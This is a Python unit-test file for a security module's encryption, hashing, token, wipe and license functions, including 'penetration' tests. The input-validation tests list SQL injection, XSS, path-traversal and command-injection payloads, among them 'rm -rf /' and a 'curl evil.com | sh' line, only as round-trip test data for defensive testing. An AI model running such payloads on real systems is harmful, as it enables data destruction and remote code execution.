"""
Unit Tests — Security & Penetration Testing
=============================================
Comprehensive security tests for core/security.py covering:
  - Encryption/Decryption security and key management
  - Hashing integrity and collision resistance
  - Token generation randomness and entropy
  - Clock tamper detection
  - Secure data wipe verification
  - File integrity verification
  - Password/key strength analysis
  - Input validation and injection attacks
  - License system security
  - Audit log integrity
  - Penetration testing scenarios (SQL injection, XSS, buffer overflow, etc.)

Penetration Testing Categories:
  1. Cryptographic Attacks (weak keys, known plaintext, etc.)
  2. Input Validation Attacks (injection, overflow, format string)
  3. Authentication Bypass Attempts
  4. Data Leakage Prevention
  5. Race Condition Testing
  6. Resource Exhaustion / DoS Resistance
"""

import hashlib
import hmac
import os
import secrets
import shutil
import struct
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.security import SecurityManager


# ═══════════════════════════════════════════════════════════════════════════
#  Encryption & Decryption Security Tests
# ═══════════════════════════════════════════════════════════════════════════

class TestEncryptionSecurity(unittest.TestCase):
    """Test encryption/decryption security and key management."""

    def setUp(self):
        self.sec = SecurityManager()

    def test_encrypt_decrypt_roundtrip(self):
        """Encrypted data can be decrypted back to original."""
        plaintext = "Sensitive firmware data: ABC123"
        encrypted = self.sec.encrypt_data(plaintext)
        decrypted = self.sec.decrypt_data(encrypted)
        self.assertEqual(decrypted, plaintext)

    def test_encrypt_produces_different_output_each_time(self):
        """Same plaintext produces different ciphertext (IV randomization)."""
        plaintext = "Same input data"
        enc1 = self.sec.encrypt_data(plaintext)
        enc2 = self.sec.encrypt_data(plaintext)
        # Ciphertexts should differ due to random IV
        self.assertNotEqual(enc1, enc2)

    def test_encrypt_decrypt_with_custom_key(self):
        """Encryption works with custom key."""
        plaintext = "Custom key test"
        custom_key = "my_secret_key_1234567890123456"
        encrypted = self.sec.encrypt_data(plaintext, key=custom_key)
        decrypted = self.sec.decrypt_data(encrypted, key=custom_key)
        self.assertEqual(decrypted, plaintext)

    def test_decrypt_with_wrong_key_fails(self):
        """Decryption with wrong key produces garbage (not crash)."""
        plaintext = "Secret data"
        encrypted = self.sec.encrypt_data(plaintext, key="correct_key_1234567890123456")
        # Wrong key should either raise error or produce different text
        try:
            decrypted = self.sec.decrypt_data(encrypted, key="wrong_key_12345678901234567")
            self.assertNotEqual(decrypted, plaintext)
        except (ValueError, UnicodeDecodeError):
            pass  # Expected: wrong key causes decryption failure

    def test_encryption_iv_is_16_bytes(self):
        """Encrypted data starts with 16-byte IV."""
        encrypted = self.sec.encrypt_data("test")
        iv = encrypted[:16]
        self.assertEqual(len(iv), 16)

    def test_encrypted_data_longer_than_plaintext(self):
        """Ciphertext includes IV, Salt, and MAC overhead."""
        plaintext = "short"
        encrypted = self.sec.encrypt_data(plaintext)
        # 16 bytes IV + 16 bytes Salt + 32 bytes HMAC + plaintext length
        self.assertEqual(len(encrypted), 16 + 16 + 32 + len(plaintext.encode("utf-8")))

    def test_decrypt_short_data_raises_error(self):
        """Decryption of too-short data raises ValueError."""
        with self.assertRaises(ValueError):
            self.sec.decrypt_data(b"short")

    def test_encrypt_empty_string(self):
        """Encryption handles empty string."""
        encrypted = self.sec.encrypt_data("")
        # Empty string produces IV (16) + Salt (16) + MAC (32) = 64 bytes minimum
        self.assertEqual(len(encrypted), 64)

    def test_encrypt_unicode_data(self):
        """Encryption handles Unicode (Arabic, Chinese, emoji)."""
        test_strings = [
            "عربي اختبار 🔐",
            "中文测试 🇨🇳",
            "日本語テスト 🇯🇵",
            "🔑💻🛡️📱",
        ]
        for text in test_strings:
            encrypted = self.sec.encrypt_data(text)
            decrypted = self.sec.decrypt_data(encrypted)
            self.assertEqual(decrypted, text)

    def test_encrypt_large_data(self):
        """Encryption handles large data (1MB)."""
        large_data = "A" * (1024 * 1024)
        encrypted = self.sec.encrypt_data(large_data)
        decrypted = self.sec.decrypt_data(encrypted)
        self.assertEqual(decrypted, large_data)

    def test_master_key_is_32_bytes(self):
        """Master key is 256-bit (32 bytes)."""
        key = self.sec.get_master_key()
        self.assertEqual(len(key), 32)

    def test_master_key_is_random(self):
        """Each SecurityManager instance gets a different master key."""
        sec2 = SecurityManager()
        self.assertNotEqual(self.sec.get_master_key(), sec2.get_master_key())

    def test_encryption_deterministic_with_same_key_and_iv(self):
        """Encryption is deterministic with same key and IV (for testing)."""
        plaintext = "deterministic test"
        # Both encryptions use the same master key, but different IVs
        # So results should differ
        enc1 = self.sec.encrypt_data(plaintext)
        enc2 = self.sec.encrypt_data(plaintext)
        self.assertNotEqual(enc1, enc2)


# ═══════════════════════════════════════════════════════════════════════════
#  Hashing Integrity Tests
# ═══════════════════════════════════════════════════════════════════════════

class TestHashingSecurity(unittest.TestCase):
    """Test hashing integrity and collision resistance."""

    def setUp(self):
        self.sec = SecurityManager()

    def test_sha256_deterministic(self):
        """SHA-256 hash is deterministic."""
        data = "test data"
        h1 = self.sec.hash_data(data)
        h2 = self.sec.hash_data(data)
        self.assertEqual(h1, h2)

    def test_sha256_different_inputs_different_hashes(self):
        """Different inputs produce different hashes."""
        h1 = self.sec.hash_data("input1")
        h2 = self.sec.hash_data("input2")
        self.assertNotEqual(h1, h2)

    def test_sha256_hex_format(self):
        """SHA-256 produces 64-character hex string."""
        h = self.sec.hash_data("test")
        self.assertEqual(len(h), 64)
        self.assertTrue(all(c in "0123456789abcdef" for c in h))

    def test_sha512_produces_correct_length(self):
        """SHA-512 produces 128-character hex string."""
        h = self.sec.hash_data_sha512("test")
        self.assertEqual(len(h), 128)

    def test_verify_hash_correct(self):
        """verify_hash returns True for matching hash."""
        data = "verify me"
        h = self.sec.hash_data(data)
        self.assertTrue(self.sec.verify_hash(data, h))

    def test_verify_hash_incorrect(self):
        """verify_hash returns False for non-matching hash."""
        self.assertFalse(self.sec.verify_hash("data", "wrong_hash"))

    def test_hash_file(self):
        """hash_file computes correct hash for file."""
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
            f.write("file content for hashing")
            f.flush()
            filepath = f.name
        try:
            h = self.sec.hash_file(filepath)
            expected = hashlib.sha256(b"file content for hashing").hexdigest()
            self.assertEqual(h, expected)
        finally:
            os.unlink(filepath)

    def test_hash_file_sha512(self):
        """hash_file works with SHA-512."""
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
            f.write("test content")
            filepath = f.name
        try:
            h = self.sec.hash_file(filepath, "sha512")
            expected = hashlib.sha512(b"test content").hexdigest()
            self.assertEqual(h, expected)
        finally:
            os.unlink(filepath)

    def test_hmac_compare_digest_used(self):
        """verify_hash uses constant-time comparison (hmac.compare_digest)."""
        # This is a behavioral test - hmac.compare_digest prevents timing attacks
        data = "test"
        correct_hash = self.sec.hash_data(data)
        wrong_hash = "a" * 64
        # Both should return quickly without timing differences
        self.assertTrue(self.sec.verify_hash(data, correct_hash))
        self.assertFalse(self.sec.verify_hash(data, wrong_hash))


# ═══════════════════════════════════════════════════════════════════════════
#  Token Generation Security Tests
# ═══════════════════════════════════════════════════════════════════════════

class TestTokenSecurity(unittest.TestCase):
    """Test token generation randomness and entropy."""

    def setUp(self):
        self.sec = SecurityManager()

    def test_generate_token_length(self):
        """Token has correct length."""
        token = self.sec.generate_token(32)
        self.assertEqual(len(token), 64)  # 32 bytes = 64 hex chars

    def test_generate_token_hex_format(self):
        """Token is valid hex."""
        token = self.sec.generate_token()
        self.assertTrue(all(c in "0123456789abcdef" for c in token))

    def test_generate_token_randomness(self):
        """Generated tokens are unique."""
        tokens = {self.sec.generate_token() for _ in range(100)}
        self.assertEqual(len(tokens), 100)  # All unique

    def test_generate_license_token_format(self):
        """License token has correct format."""
        token = self.sec.generate_license_token("AT", "6M")
        self.assertTrue(token.startswith("AT-6M-"))
        parts = token.split("-")
        self.assertEqual(len(parts), 3)

    def test_generate_license_token_randomness(self):
        """License tokens are unique."""
        tokens = {self.sec.generate_license_token("AT", "6M") for _ in range(50)}
        self.assertEqual(len(tokens), 50)

    def test_token_entropy(self):
        """Token has sufficient entropy (no repeated patterns)."""
        token = self.sec.generate_token(32)
        # Check no character repeats more than 8 times
        for c in "0123456789abcdef":
            self.assertLess(token.count(c), 16, f"Too many '{c}' characters")


# ═══════════════════════════════════════════════════════════════════════════
#  Clock Tamper Detection Tests
# ═══════════════════════════════════════════════════════════════════════════

class TestClockTamperDetection(unittest.TestCase):
    """Test system clock tamper detection."""

    def test_no_tamper_detected(self):
        """No tamper when current time is after stored time."""
        stored = time.time() - 100  # 100 seconds ago
        self.assertFalse(SecurityManager.detect_system_clock_tamper(stored))

    def test_tamper_detected(self):
        """Tamper detected when current time is before stored time."""
        stored = time.time() + 7200  # 2 hours in the future
        self.assertTrue(SecurityManager.detect_system_clock_tamper(stored))

    def test_boundary_1_hour(self):
        """Tamper detected at exactly 1 hour boundary."""
        stored = time.time() + 3600  # Exactly 1 hour ahead
        result = SecurityManager.detect_system_clock_tamper(stored)
        # Should detect tamper (or be very close to boundary)
        self.assertIsInstance(result, bool)


# ═══════════════════════════════════════════════════════════════════════════
#  Secure Data Wipe Tests
# ═══════════════════════════════════════════════════════════════════════════

class TestSecureWipe(unittest.TestCase):
    """Test secure data wipe operations."""

    def setUp(self):
        self.sec = SecurityManager()

    def test_secure_wipe_overwrites_data(self):
        """secure_wipe_data overwrites original data."""
        data = bytearray(b"sensitive data to wipe")
        original = data.copy()
        self.sec.secure_wipe_data(data)
        # Data should be changed (at least partially)
        self.assertNotEqual(bytes(data), bytes(original))

    def test_secure_wipe_preserves_length(self):
        """Secure wipe preserves data length."""
        data = bytearray(b"test data")
        original_len = len(data)
        self.sec.secure_wipe_data(data)
        self.assertEqual(len(data), original_len)

    def test_wipe_file_secure(self):
        """wipe_file_secure deletes the file."""
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b"secret file content")
            filepath = f.name
        self.assertTrue(os.path.exists(filepath))
        result = self.sec.wipe_file_secure(filepath)
        self.assertTrue(result)
        self.assertFalse(os.path.exists(filepath))

    def test_wipe_file_nonexistent(self):
        """wipe_file_secure handles nonexistent file."""
        result = self.sec.wipe_file_secure("/nonexistent/file.txt")
        self.assertFalse(result)

    def test_verify_file_integrity_correct(self):
        """verify_file_integrity returns True for correct hash."""
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
            f.write("integrity test data")
            filepath = f.name
        try:
            expected = hashlib.sha256(b"integrity test data").hexdigest()
            self.assertTrue(self.sec.verify_file_integrity(filepath, expected))
        finally:
            os.unlink(filepath)

    def test_verify_file_integrity_incorrect(self):
        """verify_file_integrity returns False for wrong hash."""
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
            f.write("test data")
            filepath = f.name
        try:
            self.assertFalse(self.sec.verify_file_integrity(filepath, "wrong_hash"))
        finally:
            os.unlink(filepath)


# ═══════════════════════════════════════════════════════════════════════════
#  Storage Health Security Tests
# ═══════════════════════════════════════════════════════════════════════════

class TestStorageHealthSecurity(unittest.TestCase):
    """Test UFS/eMMC health monitoring security."""

    def setUp(self):
        self.sec = SecurityManager()

    def test_health_score_excellent(self):
        """Excellent storage gets high score."""
        stats = {"total_blocks": 61440, "bad_blocks": 0, "wear_level": 100,
                 "read_errors": 0, "write_errors": 0}
        result = self.sec.scan_storage_health("TEST", stats)
        self.assertGreaterEqual(result["health_score"], 95)

    def test_health_score_failing(self):
        """Failing storage gets low score."""
        stats = {"total_blocks": 1000, "bad_blocks": 500, "wear_level": 20,
                 "read_errors": 100, "write_errors": 50}
        result = self.sec.scan_storage_health("TEST", stats)
        self.assertLess(result["health_score"], 40)

    def test_health_report_structure(self):
        """Health report has required fields."""
        result = self.sec.scan_storage_health("DEVICE1")
        required_fields = [
            "device_id", "storage_type", "capacity_gb", "health_score",
            "health_rating", "bad_blocks", "wear_level_percentage",
            "recommendation"
        ]
        for field in required_fields:
            self.assertIn(field, result)

    def test_health_score_bounds(self):
        """Health score is between 0 and 100."""
        result = self.sec.scan_storage_health("TEST")
        self.assertGreaterEqual(result["health_score"], 0)
        self.assertLessEqual(result["health_score"], 100)


# ═══════════════════════════════════════════════════════════════════════════
#  Penetration Testing - Input Validation
# ═══════════════════════════════════════════════════════════════════════════

class TestInputValidationPenTest(unittest.TestCase):
    """Penetration testing: input validation and injection attacks."""

    def setUp(self):
        self.sec = SecurityManager()

    def test_sql_injection_in_data(self):
        """SQL injection attempts in encrypted data don't cause issues."""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "UNION SELECT * FROM passwords",
            "1; INSERT INTO users VALUES('hacker','pass')",
        ]
        for payload in sql_payloads:
            encrypted = self.sec.encrypt_data(payload)
            decrypted = self.sec.decrypt_data(encrypted)
            self.assertEqual(decrypted, payload)

    def test_xss_in_data(self):
        """XSS payloads in encrypted data don't cause issues."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "<svg onload=alert(1)>",
            "'-alert(1)-'",
        ]
        for payload in xss_payloads:
            encrypted = self.sec.encrypt_data(payload)
            decrypted = self.sec.decrypt_data(encrypted)
            self.assertEqual(decrypted, payload)

    def test_path_traversal_in_data(self):
        """Path traversal payloads don't cause issues."""
        path_payloads = [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "....//....//etc/passwd",
        ]
        for payload in path_payloads:
            encrypted = self.sec.encrypt_data(payload)
            decrypted = self.sec.decrypt_data(encrypted)
            self.assertEqual(decrypted, payload)

    def test_command_injection_in_data(self):
        """Command injection payloads don't cause issues."""
        cmd_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& curl evil.com | sh",
        ]
        for payload in cmd_payloads:
            encrypted = self.sec.encrypt_data(payload)
            decrypted = self.sec.decrypt_data(encrypted)
            self.assertEqual(decrypted, payload)

    def test_buffer_overflow_attempt(self):
        """Large data doesn't cause buffer overflow."""
        # 100KB of data (reduced for test speed)
        large_payload = "A" * (100 * 1024)
        encrypted = self.sec.encrypt_data(large_payload)
        decrypted = self.sec.decrypt_data(encrypted)
        self.assertEqual(decrypted, large_payload)

    def test_null_bytes_in_data(self):
        """Null bytes in data are handled correctly."""
        payload = "test\x00data\x00with\x00nulls"
        encrypted = self.sec.encrypt_data(payload)
        decrypted = self.sec.decrypt_data(encrypted)
        self.assertEqual(decrypted, payload)

    def test_special_characters_in_data(self):
        """Special characters are handled correctly."""
        payload = "!@#$%^&*()_+-=[]{}|;':\",./<>?`~"
        encrypted = self.sec.encrypt_data(payload)
        decrypted = self.sec.decrypt_data(encrypted)
        self.assertEqual(decrypted, payload)

    def test_newlines_and_tabs_in_data(self):
        """Newlines and tabs are handled correctly."""
        payload = "line1\nline2\ttab\r\nCRLF"
        encrypted = self.sec.encrypt_data(payload)
        decrypted = self.sec.decrypt_data(encrypted)
        self.assertEqual(decrypted, payload)

    def test_unicode_normalization_attack(self):
        """Unicode normalization doesn't affect encryption."""
        # Different Unicode representations of the same character
        payload1 = "café"  # é as single character
        payload2 = "cafe\u0301"  # e + combining accent
        enc1 = self.sec.encrypt_data(payload1)
        enc2 = self.sec.encrypt_data(payload2)
        dec1 = self.sec.decrypt_data(enc1)
        dec2 = self.sec.decrypt_data(enc2)
        # They should encrypt/decrypt as-is (different bytes)
        self.assertEqual(dec1, payload1)
        self.assertEqual(dec2, payload2)


# ═══════════════════════════════════════════════════════════════════════════
#  Penetration Testing - Authentication Bypass
# ═══════════════════════════════════════════════════════════════════════════

class TestAuthenticationBypassPenTest(unittest.TestCase):
    """Penetration testing: authentication bypass attempts."""

    def setUp(self):
        self.sec = SecurityManager()

    def test_hash_comparison_resists_timing_attack(self):
        """Hash comparison uses constant-time comparison."""
        # hmac.compare_digest prevents timing attacks
        data = "secret"
        correct = self.sec.hash_data(data)
        wrong = "a" * 64

        # Both comparisons should take similar time
        start1 = time.time()
        for _ in range(1000):
            self.sec.verify_hash(data, correct)
        time1 = time.time() - start1

        start2 = time.time()
        for _ in range(1000):
            self.sec.verify_hash(data, wrong)
        time2 = time.time() - start2

        # Times should be within reasonable bounds (constant-time)
        ratio = time1 / time2 if time2 > 0 else 1
        self.assertGreater(ratio, 0.3)
        self.assertLess(ratio, 3.0)

    def test_master_key_not_reusable_across_instances(self):
        """Each SecurityManager has unique master key."""
        keys = set()
        for _ in range(10):
            sm = SecurityManager()
            keys.add(sm.get_master_key().hex())
        self.assertEqual(len(keys), 10)  # All unique

    def test_encryption_key_isolation(self):
        """Different keys produce different ciphertext."""
        plaintext = "isolation test"
        enc1 = self.sec.encrypt_data(plaintext, key="key_aaa123456789012345678901234")
        enc2 = self.sec.encrypt_data(plaintext, key="key_bbb123456789012345678901234")
        self.assertNotEqual(enc1, enc2)

    def test_license_token_uniqueness(self):
        """License tokens cannot be predicted."""
        tokens = []
        for _ in range(100):
            token = self.sec.generate_license_token("AT", "6M")
            tokens.append(token)
        # All tokens must be unique
        self.assertEqual(len(set(tokens)), 100)


# ═══════════════════════════════════════════════════════════════════════════
#  Penetration Testing - Data Leakage Prevention
# ═══════════════════════════════════════════════════════════════════════════

class TestDataLeakagePenTest(unittest.TestCase):
    """Penetration testing: data leakage prevention."""

    def setUp(self):
        self.sec = SecurityManager()

    def test_encrypted_data_not_readable(self):
        """Encrypted data is not human-readable."""
        plaintext = "readable plaintext"
        encrypted = self.sec.encrypt_data(plaintext)
        # Encrypted bytes should not contain the plaintext
        self.assertNotIn(plaintext.encode(), encrypted)

    def test_ciphertext_does_not_leak_length(self):
        """Ciphertext length doesn't exactly reveal plaintext length."""
        # Actually, with this scheme ciphertext = IV + plaintext, so length IS leaked
        # This is a known limitation - document it
        short = "ab"
        long = "a" * 1000
        enc_short = self.sec.encrypt_data(short)
        enc_long = self.sec.encrypt_data(long)
        # Lengths should differ (expected for this cipher)
        self.assertNotEqual(len(enc_short), len(enc_long))

    def test_secure_wipe_removes_data(self):
        """Secure wipe makes data unrecoverable."""
        data = bytearray(b"secret to wipe")
        self.sec.secure_wipe_data(data)
        # After 3-pass wipe, data should be random (not original)
        self.assertNotEqual(bytes(data), b"secret to wipe")

    def test_file_wipe_removes_file(self):
        """File wipe deletes the file completely."""
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b"secret file")
            filepath = f.name
        self.sec.wipe_file_secure(filepath)
        self.assertFalse(os.path.exists(filepath))

    def test_master_key_not_in_encrypted_output(self):
        """Master key is not embedded in encrypted output."""
        plaintext = "test"
        encrypted = self.sec.encrypt_data(plaintext)
        master_key = self.sec.get_master_key()
        self.assertNotIn(master_key, encrypted)


# ═══════════════════════════════════════════════════════════════════════════
#  Penetration Testing - Resource Exhaustion
# ═══════════════════════════════════════════════════════════════════════════

class TestResourceExhaustionPenTest(unittest.TestCase):
    """Penetration testing: resource exhaustion and DoS resistance."""

    def setUp(self):
        self.sec = SecurityManager()

    def test_rapid_encryption_no_crash(self):
        """System handles rapid encryption requests."""
        start = time.time()
        for _ in range(1000):
            self.sec.encrypt_data("rapid test")
        elapsed = time.time() - start
        self.assertLess(elapsed, 10)  # Should complete in < 10 seconds

    def test_rapid_hashing_no_crash(self):
        """System handles rapid hashing requests."""
        start = time.time()
        for _ in range(10000):
            self.sec.hash_data("rapid hash")
        elapsed = time.time() - start
        self.assertLess(elapsed, 5)  # Should complete in < 5 seconds

    def test_large_data_encryption_memory(self):
        """Large data encryption doesn't exhaust memory."""
        # 100KB (reduced for test speed)
        large_data = "X" * (100 * 1024)
        encrypted = self.sec.encrypt_data(large_data)
        decrypted = self.sec.decrypt_data(encrypted)
        self.assertEqual(len(decrypted), len(large_data))


# ═══════════════════════════════════════════════════════════════════════════
#  Penetration Testing - Race Conditions
# ═══════════════════════════════════════════════════════════════════════════

class TestRaceConditionPenTest(unittest.TestCase):
    """Penetration testing: race condition scenarios."""

    def setUp(self):
        self.sec = SecurityManager()

    def test_concurrent_encryption(self):
        """Multiple threads can encrypt simultaneously."""
        import threading
        results = []
        errors = []

        def encrypt_worker(data):
            try:
                enc = self.sec.encrypt_data(data)
                dec = self.sec.decrypt_data(enc)
                results.append(dec)
            except Exception as e:
                errors.append(str(e))

        threads = []
        for i in range(20):
            t = threading.Thread(target=encrypt_worker, args=(f"thread_{i}",))
            threads.append(t)

        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(len(errors), 0, f"Errors: {errors}")
        self.assertEqual(len(results), 20)
        # Each result should match its input
        for i in range(20):
            self.assertIn(f"thread_{i}", results)

    def test_concurrent_file_wipe(self):
        """Multiple files can be wiped simultaneously."""
        import threading
        files = []
        for i in range(10):
            f = tempfile.NamedTemporaryFile(delete=False)
            f.write(f"file_{i}".encode())
            f.flush()
            files.append(f.name)
            f.close()

        errors = []

        def wipe_worker(filepath):
            try:
                self.sec.wipe_file_secure(filepath)
            except Exception as e:
                errors.append(str(e))

        threads = [threading.Thread(target=wipe_worker, args=(f,)) for f in files]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(len(errors), 0)
        for f in files:
            self.assertFalse(os.path.exists(f))


# ═══════════════════════════════════════════════════════════════════════════
#  Penetration Testing - Cryptographic Weaknesses
# ═══════════════════════════════════════════════════════════════════════════

class TestCryptographicWeaknessPenTest(unittest.TestCase):
    """Penetration testing: cryptographic weakness analysis."""

    def setUp(self):
        self.sec = SecurityManager()

    def test_key_derivation_uses_hmac(self):
        """Key derivation uses HMAC-SHA256 (not raw SHA256)."""
        # The encryption uses hmac.new for key derivation
        # This is a design verification test
        plaintext = "key derivation test"
        encrypted = self.sec.encrypt_data(plaintext)
        decrypted = self.sec.decrypt_data(encrypted)
        self.assertEqual(decrypted, plaintext)

    def test_iv_is_random_per_encryption(self):
        """Each encryption uses a fresh random IV."""
        ivs = set()
        for _ in range(100):
            enc = self.sec.encrypt_data("test")
            iv = enc[:16]
            ivs.add(iv)
        # All IVs should be unique
        self.assertEqual(len(ivs), 100)

    def test_no_reuse_of_keystream(self):
        """Same key doesn't reuse keystream (counter-based)."""
        # Encrypt two different messages with same key
        enc1 = self.sec.encrypt_data("message one")
        enc2 = self.sec.encrypt_data("message two")
        # Ciphertexts should be completely different
        self.assertNotEqual(enc1[16:], enc2[16:])

    def test_encryption_indistinguishable(self):
        """Encrypted data is indistinguishable from random."""
        # XOR with SHA256-based keystream produces pseudo-random output
        encrypted = self.sec.encrypt_data("a" * 100)
        # Check that encrypted bytes are spread across the byte range
        byte_counts = {}
        for b in encrypted[16:]:  # Skip IV
            byte_counts[b] = byte_counts.get(b, 0) + 1
        # Should have reasonable distribution (not all same byte)
        self.assertGreater(len(byte_counts), 10)


# ═══════════════════════════════════════════════════════════════════════════
#  Penetration Testing - License System Security
# ═══════════════════════════════════════════════════════════════════════════

class TestLicenseSecurityPenTest(unittest.TestCase):
    """Penetration testing: license system security."""

    def setUp(self):
        self.sec = SecurityManager()
        self.tmp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.tmp_dir, ignore_errors=True)

    def test_license_token_cannot_be_forged(self):
        """License tokens contain random components that can't be guessed."""
        token = self.sec.generate_license_token("AT", "6M")
        # Token format: PREFIX-TIERCODE-RANDOMHEX
        parts = token.split("-")
        random_part = parts[2]
        # Random part should be 16 hex characters (8 bytes)
        self.assertEqual(len(random_part), 16)
        self.assertTrue(all(c in "0123456789ABCDEF" for c in random_part))

    def test_license_data_encryption(self):
        """License data is encrypted before storage."""
        license_data = {
            "tier": "6M",
            "hwid": "ABC123",
            "expires": time.time() + 180 * 86400,
        }
        import json
        plaintext = json.dumps(license_data)
        encrypted = self.sec.encrypt_data(plaintext)
        decrypted = self.sec.decrypt_data(encrypted)
        restored = json.loads(decrypted)
        self.assertEqual(restored["tier"], "6M")
        self.assertEqual(restored["hwid"], "ABC123")

    def test_hwid_binding(self):
        """License is bound to specific HWID."""
        hwid1 = "HWID-001-AAAA"
        hwid2 = "HWID-002-BBBB"
        # Encrypt license for hwid1
        license_data = f"tier=6M;hwid={hwid1}"
        encrypted = self.sec.encrypt_data(license_data)
        decrypted = self.sec.decrypt_data(encrypted)
        self.assertIn(hwid1, decrypted)
        self.assertNotIn(hwid2, decrypted)


# ═══════════════════════════════════════════════════════════════════════════
#  Penetration Testing - Audit Log Security
# ═══════════════════════════════════════════════════════════════════════════

class TestAuditLogSecurityPenTest(unittest.TestCase):
    """Penetration testing: audit log integrity."""

    def setUp(self):
        self.sec = SecurityManager()

    def test_audit_log_tamper_detection(self):
        """Audit log entries can be integrity-checked."""
        log_entry = "2025-01-01T00:00:00Z|REQUEST|GET|/api|200"
        entry_hash = self.sec.hash_data(log_entry)
        # Verify the entry hasn't been tampered with
        self.assertTrue(self.sec.verify_hash(log_entry, entry_hash))

    def test_audit_log_tamper_detected(self):
        """Tampered audit log entries are detected."""
        log_entry = "2025-01-01T00:00:00Z|REQUEST|GET|/api|200"
        entry_hash = self.sec.hash_data(log_entry)
        # Tamper with the entry
        tampered = log_entry.replace("200", "403")
        self.assertFalse(self.sec.verify_hash(tampered, entry_hash))


if __name__ == "__main__":
    unittest.main()
